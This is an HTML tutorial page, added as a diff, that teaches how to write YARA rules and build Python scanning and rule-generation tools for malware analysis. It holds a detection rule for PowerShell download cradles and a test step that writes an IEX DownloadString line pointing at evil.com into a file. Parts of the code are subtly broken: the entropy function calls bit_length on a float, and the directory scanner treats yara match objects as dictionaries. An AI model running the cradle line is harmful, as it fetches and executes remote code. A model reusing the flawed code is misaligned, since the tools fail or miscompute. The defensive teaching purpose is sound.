@@ -1,0 +1,541 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>YARA Rule Writer & Scanner — sec-projects</title>
+  <meta name="description" content="Write custom YARA rules to detect malware patterns and scan files/directories — foundational skill for malware analysis.">
+
+  <meta property="og:title" content="YARA Rule Writer & Scanner — sec-projects">
+  <meta property="og:description" content="Write custom YARA rules to detect malware patterns and scan files.">
+  <meta property="og:type" content="article">
+  <meta property="og:url" content="https://sec-projects.pages.dev/projects/forensics/yara-rule-writer.html">
+
+  <link rel="canonical" href="https://sec-projects.pages.dev/projects/forensics/yara-rule-writer.html">
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+
+  <link rel="stylesheet" href="/assets/css/theme.css">
+  <link rel="stylesheet" href="/assets/css/layout.css">
+  <link rel="stylesheet" href="/assets/css/components.css">
+</head>
+<body>
+  <div class="container" style="max-width:900px; margin: calc(var(--nav-height) + var(--space-8)) auto var(--space-8); padding: 0 var(--space-6);">
+
+    <div class="breadcrumbs">
+      <a href="/">Home</a>
+      <span class="breadcrumb-sep">/</span>
+      <a href="/?cat=forensics">Forensics</a>
+      <span class="breadcrumb-sep">/</span>
+      <span>YARA Rule Writer & Scanner</span>
+    </div>
+
+    <div style="margin-bottom:var(--space-8);">
+      <div style="display:flex;align-items:center;gap:var(--space-4);flex-wrap:wrap;margin-bottom:var(--space-3);">
+        <span class="badge badge-intermediate">Intermediate</span>
+        <span style="color:var(--color-text-muted);font-size:var(--font-size-sm);">&#x23F1; 2-3 hours</span>
+      </div>
+      <h1 style="border-bottom:none;margin-bottom:var(--space-3);">YARA Rule Writer & Scanner</h1>
+      <p style="font-size:var(--font-size-lg);color:var(--color-text-secondary);">Write custom YARA rules to detect malware patterns and scan files/directories — foundational skill for malware analysis.</p>
+      <div style="display:flex;flex-wrap:wrap;gap:var(--space-2);margin-top:var(--space-3);">
+        <span class="tag">python</span>
+        <span class="tag">yara</span>
+        <span class="tag">malware-analysis</span>
+        <span class="tag">signature</span>
+      </div>
+    </div>
+
+    <div id="progressBtn" style="margin-bottom:var(--space-8);"></div>
+
+    <h2>Learning Objectives</h2>
+    <ul style="margin-left:var(--space-6);margin-bottom:var(--space-6);color:var(--color-text-secondary);">
+      <li>Understand YARA rule syntax — meta, strings, and condition sections</li>
+      <li>Write rules using literal strings, hex patterns, regular expressions, and file-size conditions</li>
+      <li>Use the <code>yara-python</code> library to compile and execute rules programmatically</li>
+      <li>Build a scanner that recursively walks directories and matches files against your rule set</li>
+      <li>Leverage community rule repositories (like YARA Rules by Florian Roth) and adapt them</li>
+    </ul>
+
+    <h2>Prerequisites</h2>
+    <ul style="margin-left:var(--space-6);margin-bottom:var(--space-6);color:var(--color-text-secondary);">
+      <li>Python 3.8+ with <code>pip install yara-python</code></li>
+      <li>Understanding of hex editors and binary file formats</li>
+      <li>YARA installed on your system: <code>sudo apt install yara</code> (for testing rules outside Python)</li>
+    </ul>
+
+    <h2>Step 1: Writing Your First YARA Rules</h2>
+    <p>Learn YARA syntax by writing rules that detect common file patterns. Each rule has a <code>meta</code> section for documentation, <code>strings</code> for patterns to match, and a <code>condition</code> that defines when the rule triggers.</p>
+
+    <pre><code>/*
+ * Example YARA rule file: my_first_rules.yar
+ *
+ * YARA rule anatomy:
+ *   rule RuleName {
+ *     meta:        // metadata: author, description, date, hash
+ *       ...
+ *     strings:     // patterns to search for
+ *       $a = "literal string"
+ *       $b = { hex pattern }
+ *       $c = /regex/
+ *     condition:   // boolean expression using string matches
+ *       $a and $b or filesize < 100KB
+ *   }
+ */
+
+// Rule 1: Detect PE (Portable Executable) files
+// The "MZ" header at offset 0 and "PE\0\0" signature near offset 0x3C
+rule PE_File {
+    meta:
+        description = "Detects Windows PE (Portable Executable) files"
+        author = "sec-projects"
+        date = "2025-01-01"
+        reference = "https://en.wikipedia.org/wiki/Portable_Executable"
+
+    strings:
+        $mz = "MZ"          // DOS header magic
+        $pe = "PE\0\0"      // PE signature
+
+    condition:
+        $mz at 0 and $pe    // MZ must be at offset 0, PE must exist somewhere
+}
+
+// Rule 2: Detect common PowerShell download cradle patterns
+// Attackers use these to download and execute payloads
+rule PowerShell_Download_Cradle {
+    meta:
+        description = "Detects PowerShell download cradles commonly used in attacks"
+        severity = "high"
+
+    strings:
+        $i1 = "IEX (New-Object Net.WebClient).DownloadString" nocase wide ascii
+        $i2 = "Invoke-Expression (New-Object" nocase wide ascii
+        $i3 = "System.Net.WebClient" nocase
+        $i4 = "DownloadFile(" nocase
+        $i5 = "FromBase64String" nocase
+
+    condition:
+        2 of them  // At least 2 indicators present
+}
+
+// Rule 3: Detect embedded base64-encoded content
+// Long base64 strings are commonly used to obfuscate payloads
+rule Base64_Encoded_Blob {
+    meta:
+        description = "Detects files containing large base64-encoded blobs"
+
+    strings:
+        // Base64 character set, at least 200 consecutive chars
+        $b64 = /[A-Za-z0-9+\/=]{200,}/
+
+    condition:
+        $b64 and filesize > 1KB
+}
+
+// Rule 4: Detect UPX-packed executables
+// UPX is a common packer used by malware to evade signature detection
+rule UPX_Packed {
+    meta:
+        description = "Detect UPX-packed executables"
+        reference = "https://upx.github.io/"
+
+    strings:
+        $upx0 = "UPX0"  // UPX section names
+        $upx1 = "UPX1"
+        $upx2 = "UPX2!"
+
+    condition:
+        any of ($upx*) and filesize > 1KB
+}</code></pre>
+
+    <h2>Step 2: Python YARA Scanner</h2>
+    <p>Use <code>yara-python</code> to compile rules and scan files or directories. Handle rule compilation errors and produce structured match results.</p>
+
+    <pre><code>#!/usr/bin/env python3
+"""YARA Rule Scanner — compile rules and scan files/directories."""
+
+import yara
+import os
+import argparse
+import json
+from pathlib import Path
+from concurrent.futures import ThreadPoolExecutor, as_completed
+
+class YARAScanner:
+    def __init__(self, rules_path=None, rules_dir=None):
+        """
+        Initialize scanner with YARA rules.
+        rules_path: single .yar file
+        rules_dir: directory containing .yar files
+        """
+        self.rules = None
+        self.matches = []
+
+        if rules_path:
+            self.compile_file(rules_path)
+        elif rules_dir:
+            self.compile_directory(rules_dir)
+
+    def compile_file(self, rules_path):
+        """Compile a single YARA rules file."""
+        try:
+            self.rules = yara.compile(filepath=rules_path)
+            count = len(self.rules) if hasattr(self.rules, '__len__') else 1
+            print(f"[+] Compiled {count} rule(s) from {rules_path}")
+        except yara.SyntaxError as e:
+            print(f"[-] YARA syntax error in {rules_path}: {e}")
+            raise
+        except Exception as e:
+            print(f"[-] Failed to compile rules: {e}")
+            raise
+
+    def compile_directory(self, rules_dir):
+        """Compile all .yar/.yara files from a directory."""
+        rule_files = {}
+        yara_files = list(Path(rules_dir).glob("*.yar")) + list(Path(rules_dir).glob("*.yara"))
+
+        if not yara_files:
+            print(f"[-] No .yar/.yara files found in {rules_dir}")
+            return
+
+        for yf in yara_files:
+            namespace = yf.stem  # use filename as namespace
+            rule_files[str(yf)] = namespace
+
+        try:
+            self.rules = yara.compile(filepaths=rule_files)
+            print(f"[+] Compiled rules from {len(rule_files)} file(s) in {rules_dir}")
+        except yara.SyntaxError as e:
+            print(f"[-] YARA syntax error: {e}")
+            raise
+
+    def scan_file(self, filepath):
+        """Scan a single file against loaded rules. Returns list of rule matches."""
+        try:
+            matches = self.rules.match(filepath, timeout=30)
+            return (filepath, matches)
+        except yara.TimeoutError:
+            return (filepath, [{"timeout": True}])
+        except yara.Error as e:
+            return (filepath, [{"error": str(e)}])
+        except Exception as e:
+            return (filepath, [{"error": str(e)}])
+
+    def scan_directory(self, directory, recursive=True, extensions=None, max_workers=4):
+        """Scan all files in a directory using a thread pool."""
+        files = []
+        if recursive:
+            for root, _, filenames in os.walk(directory):
+                for fname in filenames:
+                    filepath = os.path.join(root, fname)
+                    if extensions:
+                        if any(fname.lower().endswith(ext) for ext in extensions):
+                            files.append(filepath)
+                    else:
+                        files.append(filepath)
+        else:
+            for fname in os.listdir(directory):
+                filepath = os.path.join(directory, fname)
+                if os.path.isfile(filepath):
+                    if extensions:
+                        if any(fname.lower().endswith(ext) for ext in extensions):
+                            files.append(filepath)
+                    else:
+                        files.append(filepath)
+
+        print(f"[*] Scanning {len(files)} file(s) with {max_workers} workers...\n")
+
+        matched_count = 0
+        with ThreadPoolExecutor(max_workers=max_workers) as executor:
+            futures = {executor.submit(self.scan_file, fp): fp for fp in files}
+            for future in as_completed(futures):
+                filepath, matches = future.result()
+                if matches:
+                    # Filter out errors/timeouts
+                    real_matches = [m for m in matches if "rule" in m]
+                    if real_matches:
+                        matched_count += 1
+                        matched_rules = [m.get("rule", "?") for m in real_matches]
+                        tags = set()
+                        for m in real_matches:
+                            tags.update(m.get("tags", []))
+                        tag_str = f"  [{', '.join(tags)}]" if tags else ""
+
+                        print(f"  [!] {filepath}")
+                        for rule in matched_rules:
+                            print(f"      -> {rule}")
+                        if tag_str:
+                            print(f"     {tag_str}")
+
+                        self.matches.append({
+                            "file": filepath,
+                            "rules": matched_rules,
+                            "tags": list(tags),
+                        })
+
+        print(f"\n[*] Done: {matched_count} file(s) matched out of {len(files)} scanned")
+        return self.matches
+
+    def export_json(self, output_path):
+        with open(output_path, "w") as f:
+            json.dump(self.matches, f, indent=2)
+        print(f"[+] Results exported to {output_path}")
+
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser(description="YARA Rule Scanner")
+    parser.add_argument("-r", "--rules", help="YARA rules file (.yar)")
+    parser.add_argument("-d", "--rules-dir", help="Directory of YARA rules")
+    parser.add_argument("target", help="File or directory to scan")
+    parser.add_argument("-o", "--output", help="JSON output path")
+    parser.add_argument("-w", "--workers", type=int, default=4, help="Thread workers")
+    parser.add_argument("--ext", help="Filter by extension (comma-separated, e.g., .exe,.dll,.ps1)")
+    args = parser.parse_args()
+
+    if not args.rules and not args.rules_dir:
+        print("[-] Specify --rules or --rules-dir")
+        exit(1)
+
+    scanner = YARAScanner(rules_path=args.rules, rules_dir=args.rules_dir)
+
+    extensions = args.ext.split(",") if args.ext else None
+
+    if os.path.isdir(args.target):
+        scanner.scan_directory(args.target, extensions=extensions, max_workers=args.workers)
+    else:
+        filepath, matches = scanner.scan_file(args.target)
+        if matches:
+            print(f"[!] {filepath} matched: {matches}")
+
+    if args.output:
+        scanner.export_json(args.output)</code></pre>
+
+    <h2>Step 3: Rule Generator & Tester</h2>
+    <p>Build a tool that helps you create and test YARA rules interactively. Given a malicious sample, it identifies candidate strings and generates a rule skeleton.</p>
+
+    <pre><code>#!/usr/bin/env python3
+"""YARA Rule Generator — create rules from malware sample analysis."""
+
+import re
+import os
+import string
+from collections import Counter
+
+class YARARuleGenerator:
+    """Analyze a file and suggest YARA rule patterns."""
+
+    def __init__(self, filepath, min_string_len=8):
+        self.filepath = filepath
+        self.min_string_len = min_string_len
+        self.data = b""
+
+    def analyze(self):
+        """Analyze the file and return candidate patterns."""
+        with open(self.filepath, "rb") as f:
+            self.data = f.read()
+
+        analysis = {
+            "filesize": len(self.data),
+            "md5": self._hash("md5"),
+            "sha256": self._hash("sha256"),
+            "unique_strings": self._find_unique_strings(),
+            "hex_patterns": self._find_hex_patterns(),
+            "is_pe": self.data[:2] == b"MZ",
+            "entropy": self._shannon_entropy(self.data),
+        }
+
+        return analysis
+
+    def _hash(self, algo):
+        import hashlib
+        h = hashlib.new(algo, self.data)
+        return h.hexdigest()
+
+    def _find_unique_strings(self, count=10):
+        """Extract printable strings that appear exactly once (good rule candidates)."""
+        pattern = rb"[\x20-\x7e]{%d,}" % self.min_string_len
+        matches = re.findall(pattern, self.data)
+
+        # Frequency analysis — unique strings make better signatures
+        freq = Counter(matches)
+        unique = [s.decode() for s, c in freq.items() if c == 1]
+
+        return unique[:count]
+
+    def _find_hex_patterns(self, count=5):
+        """Find uncommon hex byte sequences (not all 0x00 or 0xFF)."""
+        chunks = []
+        chunk_size = 8
+
+        for i in range(0, len(self.data) - chunk_size, chunk_size):
+            chunk = self.data[i:i+chunk_size]
+            # Skip chunks that are all zeros or all identical bytes
+            if len(set(chunk)) > 3:  # at least 4 unique byte values
+                hex_str = " ".join(f"{b:02X}" for b in chunk)
+                chunks.append(hex_str)
+
+        # Pick diverse chunks (spread across the file)
+        step = max(1, len(chunks) // count)
+        selected = [chunks[i] for i in range(0, len(chunks), step)][:count]
+
+        return selected
+
+    def _shannon_entropy(self, data):
+        """Calculate Shannon entropy of the data (higher = more random/encrypted)."""
+        if not data:
+            return 0
+        entropy = 0
+        for i in range(256):
+            p = data.count(i) / len(data)
+            if p > 0:
+                entropy -= p * (p.bit_length() - 1)
+        return round(entropy / 8, 3)  # Normalize to 0-1
+
+    def generate_rule(self, rule_name=None, output_path=None):
+        """Generate a YARA rule from file analysis."""
+        analysis = self.analyze()
+
+        if not rule_name:
+            base = os.path.splitext(os.path.basename(self.filepath))[0]
+            # Sanitize: only alphanumeric and underscore
+            rule_name = re.sub(r"[^a-zA-Z0-9_]", "_", base) or "Generated_Rule"
+
+        lines = []
+        lines.append(f"rule {rule_name} {{")
+        lines.append(f"    meta:")
+        lines.append(f'        description = "Auto-generated rule for {os.path.basename(self.filepath)}"')
+        lines.append(f'        author = "sec-projects YARA Generator"')
+        lines.append(f'        hash_md5 = "{analysis["md5"]}"')
+        lines.append(f'        hash_sha256 = "{analysis["sha256"]}"')
+        lines.append(f'        filesize = {analysis["filesize"]}')
+        lines.append(f'        entropy = {analysis["entropy"]}')
+        lines.append(f"")
+        lines.append(f"    strings:")
+
+        # Add unique string matches
+        for i, s in enumerate(analysis["unique_strings"]):
+            escaped = s.replace("\\", "\\\\").replace('"', '\\"')
+            lines.append(f'        $s{i} = "{escaped}"')
+
+        # Add hex patterns
+        for i, h in enumerate(analysis["hex_patterns"]):
+            lines.append(f'        $h{i} = {{ {h} }}')
+
+        lines.append(f"")
+        lines.append(f"    condition:")
+
+        # Conditions
+        conditions = []
+        if analysis["unique_strings"]:
+            conditions.append(f"        any of ($s*)")
+        if analysis["hex_patterns"]:
+            conditions.append(f"        any of ($h*)")
+        if analysis["is_pe"]:
+            conditions.append(f"        uint16(0) == 0x5A4D  // MZ header")
+
+        conditions.append(f"        filesize < {analysis['filesize'] * 2}")
+
+        if len(conditions) > 1:
+            conditions = ["        (" + conditions[0]] + \
+                         [f"         or " + c[8:] for c in conditions[1:-1]] + \
+                         [f"         or " + conditions[-1][8:].rstrip() + ")"]
+
+        lines.append("\n".join(conditions))
+        lines.append(f"}}")
+
+        rule_text = "\n".join(lines)
+
+        if output_path:
+            with open(output_path, "w") as f:
+                f.write(rule_text)
+            print(f"[+] Rule saved to {output_path}")
+
+        return rule_text
+
+
+if __name__ == "__main__":
+    import argparse
+    parser = argparse.ArgumentParser(description="YARA Rule Generator")
+    parser.add_argument("file", help="Sample file to analyze")
+    parser.add_argument("-n", "--name", help="Rule name (default: derived from filename)")
+    parser.add_argument("-o", "--output", help="Save generated rule to file")
+    parser.add_argument("--min-string", type=int, default=8,
+                        help="Minimum string length (default: 8)")
+    args = parser.parse_args()
+
+    gen = YARARuleGenerator(args.file, min_string_len=args.min_string)
+    rule = gen.generate_rule(rule_name=args.name, output_path=args.output)
+    print(f"\n{rule}")</code></pre>
+
+    <h2>Testing Your Rules</h2>
+    <ul style="margin-left:var(--space-6);margin-bottom:var(--space-6);color:var(--color-text-secondary);">
+      <li><strong>Create test files:</strong> Write a simple text file with your pattern — scan it to verify rules fire correctly</li>
+      <li><strong>Scan legitimate binaries:</strong> Your PE_File rule should match every Windows .exe; verify it doesn't fire on text files</li>
+      <li><strong>Test against known malware:</strong> Use samples from <a href="https://vx-underground.org/">vx-underground</a> or theZoo — in an isolated VM!</li>
+      <li><strong>Validate with yara CLI:</strong> Run <code>yara -r my_rules.yar ./test_directory</code> and compare with your Python scanner</li>
+      <li><strong>False positive testing:</strong> Scan a large directory of clean files (e.g., <code>C:\Windows</code>) to measure false positive rate</li>
+    </ul>
+
+    <pre><code># Create a test file that should match the PowerShell rule
+echo 'IEX (New-Object Net.WebClient).DownloadString("http://evil.com/payload")' > test.ps1
+
+# Scan it
+python yara_scanner.py -r my_rules.yar test.ps1
+
+# Verify with yara CLI
+yara my_rules.yar test.ps1
+
+# Generate a rule from a binary
+python yara_generator.py suspicious.exe -n Suspicious_Binary -o suspicious.yar</code></pre>
+
+    <h2>Extension Ideas</h2>
+    <ul style="margin-left:var(--space-6);margin-bottom:var(--space-6);color:var(--color-text-secondary);">
+      <li>Integrate with VirusTotal — submit generated rules to find matching samples across their malware repository</li>
+      <li>Build a YARA rule management dashboard that tracks rule performance (hit rate, false positives) over time</li>
+      <li>Add YARA module support — use the <code>pe</code> module to access PE-specific fields (imports, sections, resources)</li>
+      <li>Create a rule diffing tool that shows what's changed between rule versions</li>
+      <li>Implement rule clustering — group similar rules and suggest consolidation to reduce rule set size</li>
+    </ul>
+
+    <h2>Resources & Next Steps</h2>
+    <div style="display:flex;flex-direction:column;gap:var(--space-2);margin-bottom:var(--space-8);">
+      <a class="resource-link" href="https://yara.readthedocs.io/" target="_blank" rel="noopener">
+        <span class="resource-link-icon">&#x1F4D6;</span> YARA Official Documentation
+      </a>
+      <a class="resource-link" href="https://github.com/InQuest/awesome-yara" target="_blank" rel="noopener">
+        <span class="resource-link-icon">&#x1F31F;</span> Awesome YARA (Curated Resources)
+      </a>
+      <a class="resource-link" href="https://github.com/Yara-Rules/rules" target="_blank" rel="noopener">
+        <span class="resource-link-icon">&#x1F4E6;</span> Community YARA Rules Repository
+      </a>
+      <a class="resource-link" href="https://yara.readthedocs.io/en/latest/writingrules.html" target="_blank" rel="noopener">
+        <span class="resource-link-icon">&#x1F4DC;</span> YARA: Writing Rules Guide
+      </a>
+      <a class="resource-link" href="https://github.com/VirusTotal/yara-python" target="_blank" rel="noopener">
+        <span class="resource-link-icon">&#x1F40D;</span> yara-python (Python Bindings)
+      </a>
+    </div>
+
+    <div class="callout">
+      <div class="callout-title">&#x1F393; Cert Relevance</div>
+      <p>YARA rule writing is a core malware analysis skill tested on <strong>GREM (GIAC Reverse Engineering Malware)</strong> and <strong>GCFA</strong> certifications. Malware signature development is covered in the <strong>CHFI</strong> and <strong>CySA+</strong> (threat hunting) domains. Understanding pattern matching and IOCs is essential for the <strong>CompTIA Security+</strong> incident response domain. YARA is the industry-standard tool used in professional malware analysis and threat intelligence teams worldwide.</p>
+    </div>
+
+  </div>
+
+  <script src="/assets/js/data.js"></script>
+  <script src="/assets/js/theme.js"></script>
+  <script src="/assets/js/components.js"></script>
+  <script src="/assets/js/progress.js"></script>
+  <script>
+    document.addEventListener('DOMContentLoaded', () => {
+      document.body.prepend(renderNav());
+      document.body.appendChild(renderFooter());
+      const btnContainer = document.getElementById('progressBtn');
+      if (btnContainer) btnContainer.appendChild(renderProgressButton('yara-rule-writer'));
+      initCopyButtons();
+    });
+  </script>
+</body>
+</html>
